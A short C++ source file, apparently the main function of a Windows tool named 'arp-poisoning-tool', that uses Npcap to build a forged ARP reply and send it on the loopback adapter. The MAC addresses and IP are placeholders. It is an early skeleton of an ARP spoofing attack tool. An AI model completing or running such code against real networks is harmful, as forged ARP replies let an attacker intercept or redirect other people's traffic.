// arp-poisoning-tool.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <iostream>
#include "pcap-module.hpp"
#include "types.hpp"
#include "utilities.hpp"
#include "datagram-provider.hpp"

int main()
{
    SetDllDirectory(L"C:/Windows/System32/Npcap/");

    const char* name = "\\Device\\NPF_Loopback";
    pcap_t* fp = Open(name);

    PETHERNET pEthernet = CreateEthernetPacket(0x0608, "FF-FF-FF-FF-FF-FF", "FF-FF-FF-FF-FF-FF");
    PARPREPLY pArpReply = CreateArpReplyPacket("FF-FF-FF-FF-FF-FF", "192.168.1.100", "FF-FF-FF-FF-FF-FF", "192.168.1.100");

    int ethernetSize = sizeof(*pEthernet);
    BYTE* bEthernet = reinterpret_cast<BYTE*>(pEthernet);

    int arpReplySize = sizeof(*pArpReply);
    BYTE* bArpReply = reinterpret_cast<BYTE*>(pArpReply);

    const int totalSize = ethernetSize + arpReplySize;
    BYTE* packet = new BYTE[totalSize];

    for (int i = 0; i < ethernetSize; i++)
    {
        packet[i] = *bEthernet;
        bEthernet++;
    }

    for (int i = ethernetSize; i < totalSize; i++)
    {
        packet[i] = *bArpReply;
        bArpReply++;
    }

    Send(fp, packet, totalSize);

    delete[] packet;
    free(pArpReply);
    free(pEthernet);

    return 1;
}